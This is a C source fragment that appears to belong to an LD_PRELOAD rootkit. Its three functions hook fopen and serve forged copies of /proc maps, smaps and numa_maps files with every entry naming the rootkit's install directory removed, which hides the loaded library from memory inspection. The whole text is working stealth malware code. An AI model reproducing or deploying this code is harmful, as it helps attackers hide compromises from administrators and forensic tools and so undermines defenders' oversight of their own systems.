FILE *forge_maps(const char *pathname){
    char buf[PATH_MAX];
    FILE *o = tmpfile(), *pnt;

    hook(o_fopen, "fopen");

    pnt = o_fopen(pathname, "r");
    if(pnt == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!strstr(buf, INSTALL_DIR))
            fputs(buf, o);

    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname){
    char buf[PATH_MAX];
    int i = 0;
    FILE *o = tmpfile(), *pnt;

    hook(o_fopen, "fopen");

    pnt = o_fopen(pathname, "r");
    if(pnt == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(strstr(buf, INSTALL_DIR)) i = 1;
        if(i == 0) fputs(buf, o);
    }

    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname){
    char buf[LINE_MAX];
    FILE *o = tmpfile(), *pnt;

    hook(o_fopen, "fopen");

    pnt = o_fopen(pathname, "r");
    if(pnt == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!strstr(buf, INSTALL_DIR))
            fputs(buf, o);

    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}